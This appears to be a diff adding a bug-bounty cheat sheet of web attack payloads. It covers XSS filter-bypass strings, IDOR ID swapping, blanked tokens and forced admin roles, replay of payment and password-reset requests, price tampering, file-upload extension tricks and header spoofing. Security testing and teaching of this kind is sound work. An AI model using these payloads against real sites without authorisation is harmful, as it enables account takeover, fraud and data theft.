@@ -1,0 +1,153 @@
+💥 🔓 XSS PAYLOADS (Most Important First)
+🎯 1. Basic Test (Always Start Here)
+<script>alert(1)</script>
+
+👉 If this works → easy win
+👉 If blocked → move to bypasses
+
+🔀 2. Attribute Injection (VERY COMMON)
+"><script>alert(1)</script>
+" onmouseover="alert(1)
+
+👉 Works when input is inside HTML attributes
+
+🧠 3. Bypass Filters (IMPORTANT)
+Case bypass:
+<ScRiPt>alert(1)</ScRiPt>
+Broken tags:
+<scr<script>ipt>alert(1)</script>
+Encoded:
+%3Cscript%3Ealert(1)%3C/script%3E
+⚡ 4. Event-Based XSS (VERY POWERFUL)
+<img src=x onerror=alert(1)>
+
+👉 Works when <script> is blocked
+
+🔥 5. Advanced (When Filters Are Strong)
+javascript:alert(1)
+<a href="javascript:alert(1)">Click</a>
+🎯 Where to Use XSS:
+Search bars
+Profile fields
+Comments/messages
+URL parameters
+🔓 🔑 IDOR PAYLOADS (EASIEST BIG WINS)
+🎯 Basic Example:
+/api/user?id=123
+Try:
+id=124
+id=125
+id=1
+🔁 Advanced Variations:
+Change parameter names:
+user_id=123
+account=123
+uid=123
+🧠 JSON APIs:
+{
+  "user_id": 123
+}
+
+👉 Change to:
+
+{
+  "user_id": 124
+}
+🔥 Pro Tricks:
+Try negative numbers:
+id=-1
+Try large numbers:
+id=9999
+Try other users' IDs (from Burp history)
+🔐 AUTH BYPASS PAYLOADS
+🎯 Remove Security Controls
+Remove token:
+"token": ""
+Change role:
+"role": "admin"
+🔁 Replay Attack:
+Capture request in Burp
+Send multiple times
+
+👉 Works on:
+
+Payments
+Password resets
+Account updates
+⚙️ PARAMETER TAMPERING
+🎯 Change Hidden Values
+Example:
+{
+  "price": 100
+}
+
+👉 Change:
+
+{
+  "price": 1
+}
+🔥 Other Targets:
+quantity
+discount
+role
+email
+📂 FILE UPLOAD BYPASS
+🎯 Basic Bypass:
+file.php.jpg
+file.phtml
+🔥 Trick Upload:
+<script>alert(1)</script>
+
+Save as:
+
+test.html
+
+👉 Upload and access it
+
+🌐 API ATTACK PAYLOADS
+🎯 Modify Requests
+Remove fields:
+{
+  "user_id": 123
+}
+
+👉 Try:
+
+{}
+Add unexpected fields:
+{
+  "user_id": 123,
+  "is_admin": true
+}
+🔁 HEADER MANIPULATION
+🎯 Test Headers:
+X-Forwarded-For: 127.0.0.1
+X-Original-URL: /admin
+
+👉 Can bypass restrictions
+
+🚨 YOUR TESTING FLOW (WITH PAYLOADS)
+
+For EACH input:
+
+Basic XSS
+Attribute XSS
+Event-based XSS
+Change IDs (IDOR)
+Modify JSON
+Replay request
+💡 REALITY CHECK
+
+Most beginners fail because:
+
+❌ They try 100 payloads randomly
+❌ They don’t understand context
+🧠 WINNING APPROACH
+
+👉 Payload + Thinking = Success
+
+Ask:
+
+Where is this input reflected?
+Who should NOT access this?
+What happens if I change this?
